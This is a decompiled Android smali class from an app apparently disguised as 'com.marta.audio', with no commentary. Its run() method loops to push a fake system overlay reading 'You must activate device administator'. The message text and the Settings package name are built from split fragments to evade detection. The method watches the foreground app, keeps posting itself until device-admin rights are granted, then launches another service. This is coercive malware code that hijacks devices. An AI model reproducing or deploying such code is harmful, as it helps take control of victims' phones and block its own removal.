.class Lcom/marta/audio/w;
.super Ljava/lang/Object;

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field final synthetic a:Lcom/marta/audio/v;

.field private final synthetic b:Landroid/os/Handler;


# direct methods
.method constructor <init>(Lcom/marta/audio/v;Landroid/os/Handler;)V
    .locals 0

    iput-object p1, p0, Lcom/marta/audio/w;->a:Lcom/marta/audio/v;

    iput-object p2, p0, Lcom/marta/audio/w;->b:Landroid/os/Handler;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method static synthetic a(Lcom/marta/audio/w;)Lcom/marta/audio/v;
    .locals 1

    iget-object v0, p0, Lcom/marta/audio/w;->a:Lcom/marta/audio/v;

    return-object v0
.end method


# virtual methods
.method public run()V
    .locals 7

    const/4 v5, 0x0

    const/4 v6, 0x1

    const/16 v0, -0x10

    invoke-static {v0}, Landroid/os/Process;->setThreadPriority(I)V

    iget-object v0, p0, Lcom/marta/audio/w;->a:Lcom/marta/audio/v;

    invoke-static {v0}, Lcom/marta/audio/v;->c(Lcom/marta/audio/v;)Lcom/marta/audio/u;

    move-result-object v0

    invoke-static {v0}, Lcom/marta/audio/u;->b(Lcom/marta/audio/u;)Lcom/marta/audio/xHex;

    move-result-object v0

    const-string v1, "activity"

    invoke-virtual {v0, v1}, Lcom/marta/audio/xHex;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/ActivityManager;

    invoke-virtual {v0, v6}, Landroid/app/ActivityManager;->getRunningTasks(I)Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v5}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/ActivityManager$RunningTaskInfo;

    iget-object v1, v0, Landroid/app/ActivityManager$RunningTaskInfo;->topActivity:Landroid/content/ComponentName;

    iget-object v0, p0, Lcom/marta/audio/w;->a:Lcom/marta/audio/v;

    invoke-static {v0}, Lcom/marta/audio/v;->c(Lcom/marta/audio/v;)Lcom/marta/audio/u;

    move-result-object v0

    invoke-static {v0}, Lcom/marta/audio/u;->b(Lcom/marta/audio/u;)Lcom/marta/audio/xHex;

    move-result-object v0

    const-string v2, "device_policy"

    invoke-virtual {v0, v2}, Lcom/marta/audio/xHex;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/admin/DevicePolicyManager;

    new-instance v2, Landroid/content/ComponentName;

    iget-object v3, p0, Lcom/marta/audio/w;->a:Lcom/marta/audio/v;

    invoke-static {v3}, Lcom/marta/audio/v;->c(Lcom/marta/audio/v;)Lcom/marta/audio/u;

    move-result-object v3

    invoke-static {v3}, Lcom/marta/audio/u;->b(Lcom/marta/audio/u;)Lcom/marta/audio/xHex;

    move-result-object v3

    invoke-virtual {v3}, Lcom/marta/audio/xHex;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    const-class v4, Lcom/marta/audio/micky;

    invoke-direct {v2, v3, v4}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v2}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    move-result v2

    iget-object v0, p0, Lcom/marta/audio/w;->a:Lcom/marta/audio/v;

    invoke-static {v0}, Lcom/marta/audio/v;->c(Lcom/marta/audio/v;)Lcom/marta/audio/u;

    move-result-object v0

    invoke-static {v0}, Lcom/marta/audio/u;->b(Lcom/marta/audio/u;)Lcom/marta/audio/xHex;

    move-result-object v0

    iget-boolean v0, v0, Lcom/marta/audio/xHex;->a:Z

    if-nez v0, :cond_0

    iget-object v0, p0, Lcom/marta/audio/w;->a:Lcom/marta/audio/v;

    invoke-static {v0}, Lcom/marta/audio/v;->c(Lcom/marta/audio/v;)Lcom/marta/audio/u;

    move-result-object v0

    invoke-static {v0, v1}, Lcom/marta/audio/u;->a(Lcom/marta/audio/u;Landroid/content/ComponentName;)Z

    move-result v0

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/marta/audio/w;->a:Lcom/marta/audio/v;

    invoke-static {v0}, Lcom/marta/audio/v;->c(Lcom/marta/audio/v;)Lcom/marta/audio/u;

    move-result-object v0

    invoke-static {v0}, Lcom/marta/audio/u;->b(Lcom/marta/audio/u;)Lcom/marta/audio/xHex;

    move-result-object v0

    iput-boolean v6, v0, Lcom/marta/audio/xHex;->a:Z

    iget-object v0, p0, Lcom/marta/audio/w;->a:Lcom/marta/audio/v;

    invoke-static {v0}, Lcom/marta/audio/v;->c(Lcom/marta/audio/v;)Lcom/marta/audio/u;

    move-result-object v0

    iget-object v3, p0, Lcom/marta/audio/w;->a:Lcom/marta/audio/v;

    invoke-static {v3}, Lcom/marta/audio/v;->c(Lcom/marta/audio/v;)Lcom/marta/audio/u;

    move-result-object v3

    iget-object v3, v3, Lcom/marta/audio/u;->a:Landroid/view/WindowManager;

    iget-object v4, p0, Lcom/marta/audio/w;->a:Lcom/marta/audio/v;

    invoke-static {v4}, Lcom/marta/audio/v;->c(Lcom/marta/audio/v;)Lcom/marta/audio/u;

    move-result-object v4

    iget-object v4, v4, Lcom/marta/audio/u;->b:Landroid/view/View;

    invoke-static {v0, v3, v4}, Lcom/marta/audio/u;->a(Lcom/marta/audio/u;Landroid/view/WindowManager;Landroid/view/View;)V

    :cond_0
    iget-object v0, p0, Lcom/marta/audio/w;->a:Lcom/marta/audio/v;

    invoke-static {v0}, Lcom/marta/audio/v;->c(Lcom/marta/audio/v;)Lcom/marta/audio/u;

    move-result-object v0

    invoke-static {v0}, Lcom/marta/audio/u;->b(Lcom/marta/audio/u;)Lcom/marta/audio/xHex;

    move-result-object v0

    iget-boolean v0, v0, Lcom/marta/audio/xHex;->a:Z

    if-eqz v0, :cond_1

    iget-object v0, p0, Lcom/marta/audio/w;->a:Lcom/marta/audio/v;

    invoke-static {v0}, Lcom/marta/audio/v;->c(Lcom/marta/audio/v;)Lcom/marta/audio/u;

    move-result-object v0

    invoke-static {v0, v1}, Lcom/marta/audio/u;->a(Lcom/marta/audio/u;Landroid/content/ComponentName;)Z

    move-result v0

    if-nez v0, :cond_1

    iget-object v0, p0, Lcom/marta/audio/w;->a:Lcom/marta/audio/v;

    invoke-static {v0}, Lcom/marta/audio/v;->c(Lcom/marta/audio/v;)Lcom/marta/audio/u;

    move-result-object v0

    invoke-static {v0}, Lcom/marta/audio/u;->b(Lcom/marta/audio/u;)Lcom/marta/audio/xHex;

    move-result-object v0

    iput-boolean v5, v0, Lcom/marta/audio/xHex;->a:Z

    iget-object v0, p0, Lcom/marta/audio/w;->a:Lcom/marta/audio/v;

    invoke-static {v0}, Lcom/marta/audio/v;->c(Lcom/marta/audio/v;)Lcom/marta/audio/u;

    move-result-object v0

    invoke-static {v0}, Lcom/marta/audio/u;->b(Lcom/marta/audio/u;)Lcom/marta/audio/xHex;

    move-result-object v0

    const-string v3, "layout_inflater"

    invoke-virtual {v0, v3}, Lcom/marta/audio/xHex;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/LayoutInflater;

    const v3, 0x7f030008

    const/4 v4, 0x0

    invoke-virtual {v0, v3, v4}, Landroid/view/LayoutInflater;->inflate(ILandroid/view/ViewGroup;)Landroid/view/View;

    move-result-object v3

    iget-object v0, p0, Lcom/marta/audio/w;->a:Lcom/marta/audio/v;

    iget-object v4, p0, Lcom/marta/audio/w;->a:Lcom/marta/audio/v;

    invoke-static {v4}, Lcom/marta/audio/v;->c(Lcom/marta/audio/v;)Lcom/marta/audio/u;

    move-result-object v4

    iget-object v4, v4, Lcom/marta/audio/u;->a:Landroid/view/WindowManager;

    iget-object v5, p0, Lcom/marta/audio/w;->a:Lcom/marta/audio/v;

    invoke-static {v5}, Lcom/marta/audio/v;->c(Lcom/marta/audio/v;)Lcom/marta/audio/u;

    move-result-object v5

    iget-object v5, v5, Lcom/marta/audio/u;->c:Landroid/view/WindowManager$LayoutParams;

    invoke-static {v0, v4, v3, v5}, Lcom/marta/audio/v;->a(Lcom/marta/audio/v;Landroid/view/WindowManager;Landroid/view/View;Landroid/view/WindowManager$LayoutParams;)V

    const v0, 0x7f070038

    invoke-virtual {v3, v0}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/TextView;

    const-string v4, "\nActio"

    const-string v5, "n requir"

    invoke-virtual {v4, v5}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    const-string v5, "ed.\n\nThis is sy"

    invoke-virtual {v4, v5}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    const-string v5, "stem applica"

    invoke-virtual {v4, v5}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    const-string v5, "tion.\n\n   You mu"

    invoke-virtual {v4, v5}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    const-string v5, "st activate "

    invoke-virtual {v4, v5}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    const-string v5, "device administator.   \n"

    invoke-virtual {v4, v5}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v0, v4}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    const v0, 0x7f070039

    invoke-virtual {v3, v0}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/Button;

    new-instance v4, Lcom/marta/audio/x;

    invoke-direct {v4, p0, v3}, Lcom/marta/audio/x;-><init>(Lcom/marta/audio/w;Landroid/view/View;)V

    invoke-virtual {v0, v4}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    const-string v0, "com."

    const-string v3, "a"

    const-string v4, "oid.se"

    const-string v5, "ttings"

    invoke-virtual {v4, v5}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v3}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1}, Landroid/content/ComponentName;->getClassName()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_1

    iget-object v0, p0, Lcom/marta/audio/w;->a:Lcom/marta/audio/v;

    invoke-static {v0}, Lcom/marta/audio/v;->a(Lcom/marta/audio/v;)V

    :cond_1
    if-nez v2, :cond_2

    iget-object v0, p0, Lcom/marta/audio/w;->a:Lcom/marta/audio/v;

    invoke-static {v0}, Lcom/marta/audio/v;->c(Lcom/marta/audio/v;)Lcom/marta/audio/u;

    move-result-object v0

    iget-object v1, p0, Lcom/marta/audio/w;->b:Landroid/os/Handler;

    const/16 v3, 0xa

    invoke-static {v0, v1, p0, v3}, Lcom/marta/audio/u;->a(Lcom/marta/audio/u;Landroid/os/Handler;Ljava/lang/Runnable;I)V

    :cond_2
    if-eqz v2, :cond_3

    iget-object v0, p0, Lcom/marta/audio/w;->a:Lcom/marta/audio/v;

    invoke-static {v0}, Lcom/marta/audio/v;->c(Lcom/marta/audio/v;)Lcom/marta/audio/u;

    move-result-object v0

    invoke-static {v0}, Lcom/marta/audio/u;->b(Lcom/marta/audio/u;)Lcom/marta/audio/xHex;

    move-result-object v0

    new-instance v1, Landroid/content/Intent;

    iget-object v2, p0, Lcom/marta/audio/w;->a:Lcom/marta/audio/v;

    invoke-static {v2}, Lcom/marta/audio/v;->c(Lcom/marta/audio/v;)Lcom/marta/audio/u;

    move-result-object v2

    invoke-static {v2}, Lcom/marta/audio/u;->b(Lcom/marta/audio/u;)Lcom/marta/audio/xHex;

    move-result-object v2

    invoke-virtual {v2}, Lcom/marta/audio/xHex;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    const-class v3, Lcom/marta/audio/xr;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v1}, Lcom/marta/audio/xHex;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    iget-object v0, p0, Lcom/marta/audio/w;->a:Lcom/marta/audio/v;

    invoke-static {v0}, Lcom/marta/audio/v;->b(Lcom/marta/audio/v;)V

    iget-object v0, p0, Lcom/marta/audio/w;->a:Lcom/marta/audio/v;

    invoke-static {v0}, Lcom/marta/audio/v;->c(Lcom/marta/audio/v;)Lcom/marta/audio/u;

    move-result-object v0

    invoke-static {v0}, Lcom/marta/audio/u;->b(Lcom/marta/audio/u;)Lcom/marta/audio/xHex;

    move-result-object v0

    iput-boolean v6, v0, Lcom/marta/audio/xHex;->b:Z

    iget-object v0, p0, Lcom/marta/audio/w;->a:Lcom/marta/audio/v;

    invoke-static {v0}, Lcom/marta/audio/v;->c(Lcom/marta/audio/v;)Lcom/marta/audio/u;

    move-result-object v0

    invoke-static {v0}, Lcom/marta/audio/u;->b(Lcom/marta/audio/u;)Lcom/marta/audio/xHex;

    move-result-object v0

    invoke-virtual {v0}, Lcom/marta/audio/xHex;->stopSelf()V

    :cond_3
    return-void
.end method
